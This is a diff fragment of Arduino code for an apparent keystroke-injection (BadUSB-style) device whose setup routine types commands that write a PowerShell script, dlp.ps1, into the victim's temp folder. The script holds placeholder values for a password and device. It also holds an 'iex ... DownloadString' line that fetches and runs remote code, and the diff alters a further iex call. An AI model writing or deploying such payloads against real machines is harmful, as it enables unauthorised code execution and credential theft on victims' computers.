@@ -20,7 +20,7 @@ void setup(){
   Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dlp.ps1");
   Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dlp.ps1");
   Keyboard.println("echo iex ((New-Object Net.WebClient).DownloadString(\"INPUT4\")); >> %temp%\\dlp.ps1");
-  Keyboard.println("echo $pv = iex (INPUT5) >> %temp%\\dlp.ps1");
+  Keyboard.println("echo $pv = iex INPUT5 >> %temp%\\dlp.ps1");
   delay(2000);
 
   String fn = "dlp";
